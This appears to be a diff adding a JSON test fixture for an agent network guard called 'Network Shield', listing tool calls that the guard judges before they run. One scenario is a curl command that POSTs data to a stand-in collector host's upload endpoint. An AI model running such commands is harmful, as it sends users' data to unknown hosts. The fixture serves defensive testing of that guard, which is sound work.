@@ -1,0 +1,33 @@
+{
+ "about": "What each Network Shield attack row does (tool, arguments, and whether lockdown is on), keyed by row id. No call is ever made: the guard judges the call before it runs.",
+ "scenarios": {
+  "agent-curl-unknown-host": {
+   "tool": "terminal",
+   "lockdown": true,
+   "args": {
+    "command": "curl -s -X POST --data 'hello' https://collector.unknown-host-blackbox-test.com/upload"
+   }
+  },
+  "agent-block-list": {
+   "tool": "web_extract",
+   "args": {
+    "urls": [
+     "https://blocked-by-you-blackbox-test.com/page"
+    ]
+   }
+  },
+  "agent-allowed-host": {
+   "tool": "terminal",
+   "lockdown": true,
+   "args": {
+    "command": "git clone https://github.com/example/project.git"
+   }
+  },
+  "agent-listed-tracker": {
+   "tool": "terminal",
+   "args": {
+    "command": "curl -s https://pixel.listed-tracker-blackbox-test.com/collect.gif"
+   }
+  }
+ }
+}
